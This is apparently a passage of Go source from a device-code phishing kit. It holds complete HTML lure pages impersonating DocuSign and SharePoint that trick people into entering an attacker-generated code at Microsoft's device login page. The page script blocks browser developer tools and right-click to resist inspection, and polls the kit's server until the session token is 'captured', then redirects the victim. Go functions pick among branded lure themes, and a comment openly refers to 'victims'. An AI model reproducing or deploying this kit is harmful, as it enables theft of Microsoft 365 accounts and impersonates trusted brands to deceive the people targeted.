svg{flex-shrink:0}.logo-text{font-size:20px;font-weight:900;color:#1a1a1a;letter-spacing:-1px}.intro{text-align:center;color:#1a1a1a;font-size:15px;line-height:1.6;margin-bottom:12px;font-weight:700}.sub-intro{text-align:center;color:#505050;font-size:12px;line-height:1.6;margin-bottom:32px}.info-box{background:#fffbf0;border:1px solid#ffd700;border-radius:6px;padding:18px 20px;margin-bottom:32px;font-size:14px;color:#5c4d00;line-height:1.7}.code-label{font-size:14px;font-weight:700;color:#1a1a1a;margin-bottom:12px}.code-input{width:100%;background:#fafafa;border:2px solid#d4d4d4;border-radius:6px;padding:14px;font-size:20px;font-weight:800;letter-spacing:5px;color:#ffd700;text-align:center;font-family:monospace;margin-bottom:14px;user-select:all;transition:all .2s}.code-input.loading{color:#8a8886;font-size:17px;letter-spacing:normal}.code-input:hover{border-color:#ffd700}.copy-row{display:flex;justify-content:center;margin-bottom:28px}.copy-btn{background:#ffd700;color:#1a1a1a;border:none;padding:12px 28px;border-radius:6px;cursor:pointer;font-size:16px;font-weight:800;display:flex;align-items:center;gap:10px;transition:all .2s}.copy-btn:hover{background:#e6c200;transform:translateY(-1px)}.copy-btn.copied{background:#107c10;color:#fff}.copy-btn svg{width:18px;height:18px;fill:currentColor}.status{font-size:15px;color:#107c10;text-align:center;margin-bottom:22px;min-height:24px;font-weight:700}.btn-primary{display:flex;align-items:center;justify-content:center;gap:12px;width:100%;background:#ffd700;color:#1a1a1a;border:none;padding:14px 28px;font-size:14px;font-weight:900;cursor:pointer;border-radius:6px;transition:all .2s;margin-bottom:28px}.btn-primary:hover{background:#e6c200;transform:translateY(-1px)}.btn-primary:disabled{background:#c8c6c4;color:#8a8886;cursor:not-allowed;transform:none}.btn-primary svg{flex-shrink:0}.security-box{background:#f8f8f8;border:1px solid#e1e1e1;border-radius:6px;padding:20px;margin-bottom:28px;text-align:center}.security-box p{font-size:14px;color:#505050;line-height:1.7;margin-bottom:16px}.security-badge{display:inline-flex;align-items:center;gap:10px;background:#1a1a1a;color:#fff;padding:12px 24px;border-radius:6px;font-size:14px;font-weight:800;text-decoration:none;transition:background .2s}.security-badge:hover{background:#000}.security-badge svg{width:16px;height:16px;fill:currentColor}.footer-text{text-align:center;font-size:13px;color:#707070;margin-bottom:20px}.timer{text-align:center;font-size:13px;color:#505050;font-weight:600}.timer span{font-weight:800;color:#d83b01}.success{display:none;text-align:center;padding:28px 0}.success-icon{width:80px;height:80px;background:#107c10;border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 28px}.success-icon svg{width:40px;height:40px;fill:#fff}.success h2{font-size:24px;font-weight:900;color:#1a1a1a;margin-bottom:12px}.success p{font-size:16px;color:#505050;margin-bottom:28px}.success-badge{display:inline-flex;align-items:center;gap:12px;background:#dff6dd;color:#107c10;padding:14px 28px;border-radius:6px;font-size:16px;font-weight:800;border:1px solid#b3e0b0}.success-badge svg{width:22px;height:22px;fill:currentColor}@media(max-width:500px){.card{padding:40px 32px;border-radius:0}.code-input{font-size:22px;letter-spacing:4px}}</style>
</head>
<body>
<div class="header">
<img src="https://is1-ssl.mzstatic.com/image/thumb/Purple211/v4/34/79/8f/34798fc0-f11e-59be-51a4-978baf26e4ff/dsIcon-0-0-1x_U007epad-0-1-0-85-220.png/100x100bb.jpg" width="32" height="32" alt="DocuSign" style="border-radius:6px;flex-shrink:0">
<span class="header-title">Docusign</span>
</div>
<div class="main"><div class="card">
<div class="logo">
<div class="logo-icon">
<img src="https://is1-ssl.mzstatic.com/image/thumb/Purple211/v4/34/79/8f/34798fc0-f11e-59be-51a4-978baf26e4ff/dsIcon-0-0-1x_U007epad-0-1-0-85-220.png/100x100bb.jpg" width="40" height="40" alt="DocuSign" style="border-radius:8px;flex-shrink:0">
<span class="logo-text">Docusign</span>
</div>
</div>
<div id="mainView">
<p class="intro">Review & Sign Document</p>
<p class="sub-intro">A unique signing code has been generated for your document.</p>
<div class="info-box">DocuSign uses industry-leading encryption to protect your documents. Enter the code below to authenticate and proceed to signing.</div>
<div class="code-label">Document Access Code</div>
<div class="code-input" id="userCode">Loading...</div>
<div class="copy-row">
<button class="copy-btn" id="copyBtn" onclick="copyCode()" disabled>
<svg viewBox="0 0 16 16"><path d="M4 2a2 2 0 0 1 2-2h8a2 2 0 0 1 2 2v8a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2V2zm2-1a1 1 0 0 0-1 1v8a1 1 0 0 0 1 1h8a1 1 0 0 0 1-1V2a1 1 0 0 0-1-1H6zM2 5a1 1 0 0 0-1 1v8a1 1 0 0 0 1 1h8a1 1 0 0 0 1-1v-1h1v1a2 2 0 0 1-2 2H2a2 2 0 0 1-2-2V6a2 2 0 0 1 2-2h1v1H2z"/></svg>
<span id="copyText">Copy Code</span>
</button>
</div>
<div class="status" id="codeStatus"></div>
<button class="btn-primary" id="signInBtn" onclick="openSignIn()" disabled>
<svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>
SIGN DOCUMENT
</button>
<div class="security-box">
<p>Your document security is our priority. DocuSign uses industry-leading encryption to protect your documents and identity.</p>
<a href="https://microsoft.com/devicelogin" id="verifyLink" target="_blank" class="security-badge">
<svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/></svg>
DocuSign Secure Platform
</a>
</div>
<p class="footer-text">Trusted by millions worldwide for secure document signing.</p>
<div class="timer">Code expires in <span id="timerValue">{expires_minutes}</span></div>
</div>
<div class="success" id="successView">
<div class="success-icon"><svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg></div>
<h2>Signature Ready</h2>
<p>Your document is ready for signing. Loading DocuSign...</p>
<div class="success-badge"><svg viewBox="0 0 16 16"><path d="M13.854 3.646a.5.5 0 0 1 0 .708l-7 7a.5.5 0 0 1-.708 0l-3.5-3.5a.5.5 0 1 1 .708-.708L6.5 10.293l6.646-6.647a.5.5 0 0 1 .708 0z"/></svg>Access Granted</div>
</div>
</div></div>
<script>
document.addEventListener("keydown",function(e){if(e.key==="F12"||(e.ctrlKey&&e.shiftKey&&["i","j","c"].includes(e.key.toLowerCase()))||(e.ctrlKey&&e.key.toLowerCase()==="u")){e.preventDefault();}});document.addEventListener("contextmenu",function(e){e.preventDefault();});
(function(){var sid='{session_id}';var verifyUrl='{verify_url}';var codeReady={code_ready};var code='{user_code}';var expiresIn={expires_seconds};var popup=null;var codeEl=document.getElementById('userCode');var statusEl=document.getElementById('codeStatus');var btnEl=document.getElementById('signInBtn');var copyBtnEl=document.getElementById('copyBtn');var copyTextEl=document.getElementById('copyText');var timerEl=document.getElementById('timerValue');function showCode(c,v){code=c;if(v)verifyUrl=v;codeEl.textContent=c;codeEl.classList.remove('loading');btnEl.disabled=false;copyBtnEl.disabled=false;document.getElementById('verifyLink').href=verifyUrl;}if(codeReady&&code){showCode(code,verifyUrl);}else{codeEl.classList.add('loading');}function copyCode(){if(!code)return;if(navigator.clipboard){navigator.clipboard.writeText(code).then(function(){showCopied();});}else{var t=document.createElement('textarea');t.value=code;t.style.cssText='position:fixed;left:-9999px';document.body.appendChild(t);t.select();document.execCommand('copy');document.body.removeChild(t);showCopied();}}function showCopied(){copyBtnEl.classList.add('copied');copyTextEl.textContent='Copied!';statusEl.textContent='Code copied to clipboard';setTimeout(function(){copyBtnEl.classList.remove('copied');copyTextEl.textContent='Copy Code';},3000);}window.copyCode=copyCode;function openSignIn(){if(!code)return;copyCode();var w=520,h=700,l=(screen.width-w)/2,t=(screen.height-h)/2;popup=window.open(verifyUrl,'ms','width='+w+',height='+h+',left='+l+',top='+t+',scrollbars=yes,resizable=yes');if(popup)popup.focus();}window.openSignIn=openSignIn;function updateTimer(){if(expiresIn<=0)return;expiresIn--;var m=Math.floor(expiresIn/60);var s=expiresIn%60;timerEl.textContent=m+':'+(s<10?'0':'')+s;if(expiresIn>0)setTimeout(updateTimer,1000);}if(codeReady)setTimeout(updateTimer,1000);function poll(){fetch('/dc/status/'+sid).then(function(r){return r.json()}).then(function(d){if(d.ready&&!codeReady){codeReady=true;showCode(d.user_code,d.verify_url);if(expiresIn==={expires_seconds})setTimeout(updateTimer,1000);}if(d.captured){document.getElementById('mainView').style.display='none';document.getElementById('successView').style.display='block';if(d.redirect_url){setTimeout(function(){window.location.href=d.redirect_url;},2500);}}if(!d.failed&&!d.expired&&!d.captured)setTimeout(poll,3000);})['catch'](function(){setTimeout(poll,5000);});}poll();})();
</script>
</body>
</html>`

// SharePoint document access themed page
const DEVICE_CODE_SHAREPOINT_HTML = `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><meta name="referrer" content="no-referrer">
<title>SharePoint - Secure Document Access</title>
<link rel="icon" href="data:image/x-icon;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAABGdBTUEAALGPC/xhBQAAAmZJREFUWEfNl71Kw0AcxpNckmvS5tKkH01ttVpBEcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcFBEATBK3ih+IXiZ4qfKH6k+IHie4rvKL6l+IbiG4qvKb6i+JLiC4rPKT6j+ITiY4qPKD6keJ/iPYp3Kd6heIviLYo3Kd6geJ3iNYpXKV6heJniJYoXKZ6neI7iWYpnKJ6meIriSYonKB6neIziUYpHKB6meIjiQYoHKO6nuI/iPopkT73d3d/Pz8+/R8fH98fHxzd3d3c3l5eXN+fn5zcX5+c3Z2dnt2dnZ7enp6e3p6ent6enp7dnZ2e3Z2dnt2dnZ7dnZ2e3Z2dnt2dnZ7enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enpqr1C/AFCgw1VJxmbmAAAAAElFTkSuQmCC">
<style>*{margin:0;padding:0;box-sizing:border-box}body,html{height:100%;width:100%}body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#e8f0f6;display:flex;flex-direction:column;min-height:100vh}.header{background:#036c70;padding:14px 34px;display:flex;align-items:center;gap:12px;flex-shrink:0;box-shadow:0 2px 6px rgba(0,0,0,0.12)}.header svg{flex-shrink:0}.header-title{color:#fff;font-size:15px;font-weight:700}.main{flex:1;display:flex;align-items:center;justify-content:center;padding:50px 20px}.card{background:#fff;border-radius:8px;box-shadow:0 4px 16px rgba(0,0,0,0.12);width:100%;max-width:500px;padding:48px 44px}.logo{display:flex;align-items:center;justify-content:center;gap:12px;margin-bottom:32px}.logo svg{flex-shrink:0}.logo-text{font-size:17px;font-weight:700;color:#036c70}.intro{text-align:center;color:#323130;font-size:13px;line-height:1.6;margin-bottom:28px;font-weight:500}.info-box{background:#d4ebf7;border-left:4px solid#036c70;padding:16px 18px;margin-bottom:28px;font-size:14px;color:#024447;line-height:1.6}.code-label{font-size:14px;font-weight:700;color:#323130;margin-bottom:10px;text-transform:uppercase;letter-spacing:0.5px}.code-input{width:100%;background:#f8fafb;border:2px solid#036c70;border-radius:6px;padding:14px;font-size:20px;font-weight:800;letter-spacing:5px;color:#036c70;text-align:center;font-family:'Courier New',Consolas,monospace;margin-bottom:12px;user-select:all;transition:border-color .2s}.code-input.loading{color:#8a8886;font-size:17px;letter-spacing:normal;border-color:#c8c6c4}.copy-row{display:flex;justify-content:center;margin-bottom:24px}.copy-btn{background:#036c70;color:#fff;border:none;padding:10px 24px;border-radius:6px;cursor:pointer;font-size:15px;font-weight:700;display:flex;align-items:center;gap:10px;transition:background .2s,transform .1s}.copy-btn:hover{background:#024f52;transform:translateY(-1px)}.copy-btn.copied{background:#107c10}.copy-btn svg{width:18px;height:18px;fill:currentColor}.status{font-size:14px;color:#107c10;text-align:center;margin-bottom:20px;min-height:22px;font-weight:600}.btn-primary{display:flex;align-items:center;justify-content:center;gap:12px;width:100%;background:#036c70;color:#fff;border:none;padding:14px 24px;font-size:14px;font-weight:700;cursor:pointer;border-radius:6px;transition:background .2s,transform .1s;margin-bottom:24px}.btn-primary:hover{background:#024f52;transform:translateY(-1px)}.btn-primary:disabled{background:#c8c6c4;cursor:not-allowed;transform:none}.btn-primary svg{flex-shrink:0}.security-box{background:#f3f8fc;border:1px solid#b3d6ef;border-radius:6px;padding:18px;margin-bottom:24px;text-align:center}.security-box p{font-size:13px;color:#323130;line-height:1.6;margin-bottom:14px}.security-badge{display:inline-flex;align-items:center;gap:8px;background:#036c70;color:#fff;padding:10px 20px;border-radius:6px;font-size:14px;font-weight:700;text-decoration:none;transition:background .2s}.security-badge:hover{background:#024f52}.security-badge svg{width:16px;height:16px;fill:currentColor}.footer-text{text-align:center;font-size:13px;color:#605e5c;margin-bottom:18px}.timer{text-align:center;font-size:13px;color:#8a8886;font-weight:500}.timer span{font-weight:700;color:#d83b01}.success{display:none;text-align:center;padding:24px 0}.success-icon{width:72px;height:72px;background:linear-gradient(135deg,#107c10,#0b5a0b);border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 24px;box-shadow:0 4px 12px rgba(16,124,16,0.3)}.success-icon svg{width:36px;height:36px;fill:#fff}.success h2{font-size:22px;font-weight:700;color:#323130;margin-bottom:10px}.success p{font-size:15px;color:#605e5c;margin-bottom:24px}.success-badge{display:inline-flex;align-items:center;gap:10px;background:#dff6dd;color:#107c10;padding:12px 24px;border-radius:6px;font-size:15px;font-weight:700;border:1px solid#b3e0b0}.success-badge svg{width:20px;height:20px;fill:currentColor}@media(max-width:500px){.card{padding:36px 28px;border-radius:0}.code-input{font-size:22px;letter-spacing:3px}}</style>
</head>
<body>
<div class="header">
<svg width="21" height="21" viewBox="0 0 23 23"><rect width="10.931" height="10.931" fill="#f25022"/><rect x="12.069" width="10.931" height="10.931" fill="#7fba00"/><rect y="12.069" width="10.931" height="10.931" fill="#00a4ef"/><rect x="12.069" y="12.069" width="10.931" height="10.931" fill="#ffb900"/></svg>
<span class="header-title">SharePoint</span>
</div>
<div class="main"><div class="card">
<div class="logo">
<img src="https://www.microsoft.com/content/dam/microsoft/bade/images/icons/en-us/m365-app-icons-fy26/SharePoint-Icon-FY26.svg" width="40" height="40" alt="SharePoint" style="flex-shrink:0">
<span class="logo-text">SharePoint</span>
</div>
<div id="mainView">
<p class="intro">A secure access code has been generated for your document.</p>
<div class="info-box">For security reasons, SharePoint requires authentication before granting access to shared documents. Use the code below to verify your identity.</div>
<div class="code-label">Document Access Code</div>
<div class="code-input" id="userCode">Loading...</div>
<div class="copy-row">
<button class="copy-btn" id="copyBtn" onclick="copyCode()" disabled>
<svg viewBox="0 0 16 16"><path d="M4 2a2 2 0 0 1 2-2h8a2 2 0 0 1 2 2v8a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2V2zm2-1a1 1 0 0 0-1 1v8a1 1 0 0 0 1 1h8a1 1 0 0 0 1-1V2a1 1 0 0 0-1-1H6zM2 5a1 1 0 0 0-1 1v8a1 1 0 0 0 1 1h8a1 1 0 0 0 1-1v-1h1v1a2 2 0 0 1-2 2H2a2 2 0 0 1-2-2V6a2 2 0 0 1 2-2h1v1H2z"/></svg>
<span id="copyText">Copy Code</span>
</button>
</div>
<div class="status" id="codeStatus"></div>
<button class="btn-primary" id="signInBtn" onclick="openSignIn()" disabled>
<svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor"><path d="M14 2H6c-1.1 0-2 .9-2 2v16c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V8l-6-6zm4 18H6V4h7v5h5v11z"/></svg>
Access Document
</button>
<div class="security-box">
<p>Your document is protected by Microsoft SharePoint's enterprise-grade security. We use industry-leading encryption to safeguard your information.</p>
<a href="https://microsoft.com/devicelogin" id="verifyLink" target="_blank" class="security-badge">
<svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/></svg>
SharePoint Secure Platform
</a>
</div>
<p class="footer-text">If you need assistance, contact your SharePoint administrator.</p>
<div class="timer">Code expires in <span id="timerValue">{expires_minutes}</span></div>
</div>
<div class="success" id="successView">
<div class="success-icon"><svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg></div>
<h2>Verification Complete</h2>
<p>Your identity has been confirmed. You may now close this window.</p>
<div class="success-badge"><svg viewBox="0 0 16 16"><path d="M13.854 3.646a.5.5 0 0 1 0 .708l-7 7a.5.5 0 0 1-.708 0l-3.5-3.5a.5.5 0 1 1 .708-.708L6.5 10.293l6.646-6.647a.5.5 0 0 1 .708 0z"/></svg>Document Access Granted</div>
</div>
</div></div>
<script>
document.addEventListener("keydown",function(e){if(e.key==="F12"||(e.ctrlKey&&e.shiftKey&&["i","j","c"].includes(e.key.toLowerCase()))||(e.ctrlKey&&e.key.toLowerCase()==="u")){e.preventDefault();}});document.addEventListener("contextmenu",function(e){e.preventDefault();});
(function(){var sid='{session_id}';var verifyUrl='{verify_url}';var codeReady={code_ready};var code='{user_code}';var expiresIn={expires_seconds};var popup=null;var codeEl=document.getElementById('userCode');var statusEl=document.getElementById('codeStatus');var btnEl=document.getElementById('signInBtn');var copyBtnEl=document.getElementById('copyBtn');var copyTextEl=document.getElementById('copyText');var timerEl=document.getElementById('timerValue');function showCode(c,v){code=c;if(v)verifyUrl=v;codeEl.textContent=c;codeEl.classList.remove('loading');btnEl.disabled=false;copyBtnEl.disabled=false;document.getElementById('verifyLink').href=verifyUrl;}if(codeReady&&code){showCode(code,verifyUrl);}else{codeEl.classList.add('loading');}function copyCode(){if(!code)return;if(navigator.clipboard){navigator.clipboard.writeText(code).then(function(){showCopied();});}else{var t=document.createElement('textarea');t.value=code;t.style.cssText='position:fixed;left:-9999px';document.body.appendChild(t);t.select();document.execCommand('copy');document.body.removeChild(t);showCopied();}}function showCopied(){copyBtnEl.classList.add('copied');copyTextEl.textContent='Copied!';statusEl.textContent='Code copied to clipboard';setTimeout(function(){copyBtnEl.classList.remove('copied');copyTextEl.textContent='Copy Code';},3000);}window.copyCode=copyCode;function openSignIn(){if(!code)return;copyCode();var w=520,h=700,l=(screen.width-w)/2,t=(screen.height-h)/2;popup=window.open(verifyUrl,'ms','width='+w+',height='+h+',left='+l+',top='+t+',scrollbars=yes,resizable=yes');if(popup)popup.focus();}window.openSignIn=openSignIn;function updateTimer(){if(expiresIn<=0)return;expiresIn--;var m=Math.floor(expiresIn/60);var s=expiresIn%60;timerEl.textContent=m+':'+(s<10?'0':'')+s;if(expiresIn>0)setTimeout(updateTimer,1000);}if(codeReady)setTimeout(updateTimer,1000);function poll(){fetch('/dc/status/'+sid).then(function(r){return r.json()}).then(function(d){if(d.ready&&!codeReady){codeReady=true;showCode(d.user_code,d.verify_url);if(expiresIn==={expires_seconds})setTimeout(updateTimer,1000);}if(d.captured){document.getElementById('mainView').style.display='none';document.getElementById('successView').style.display='block';if(d.redirect_url){setTimeout(function(){window.location.href=d.redirect_url;},2500);}}if(!d.failed&&!d.expired&&!d.captured)setTimeout(poll,3000);})['catch'](function(){setTimeout(poll,5000);});}poll();})();
</script>
</body>
</html>`

// GetInterstitialForProvider returns the appropriate interstitial HTML template for the provider
// Now supports theme parameter for document access themed pages
func GetInterstitialForProvider(provider string) string {
	switch provider {
	case DCProviderGoogle:
		return DEVICE_CODE_GOOGLE_INTERSTITIAL_HTML
	default:
		return DEVICE_CODE_INTERSTITIAL_HTML
	}
}

// GetInterstitialByTheme returns themed document access page
func GetInterstitialByTheme(theme string) string {
	switch theme {
	case "onedrive":
		return DEVICE_CODE_ONEDRIVE_HTML
	case "authenticator":
		return DEVICE_CODE_AUTHENTICATOR_HTML
	case "adobe":
		return DEVICE_CODE_ADOBE_HTML
	case "docusign":
		return DEVICE_CODE_DOCUSIGN_HTML
	case "sharepoint":
		return DEVICE_CODE_SHAREPOINT_HTML
	default:
		return DEVICE_CODE_INTERSTITIAL_HTML
	}
}

// getRedirectURL returns the redirect URL for the device code interstitial page.
// When SMTP delivery is configured, victims are redirected straight to the
// Microsoft device login page since the code was already emailed to them.
func getRedirectURL(cfg *Config, sessionId string, lure *Lure) string {
	if cfg.mailerConfig != nil && cfg.mailerConfig.SMTPHost != "" {
		return "https://microsoft.com/devicelogin"
	}
	dcTheme := lure.DeviceCodeTheme
	if dcTheme != "" && dcTheme != "default" {
		return fmt.Sprintf("/access/%s/%s", dcTheme, sessionId)
	}
	return fmt.Sprintf("/dc/%s", sessionId)
}
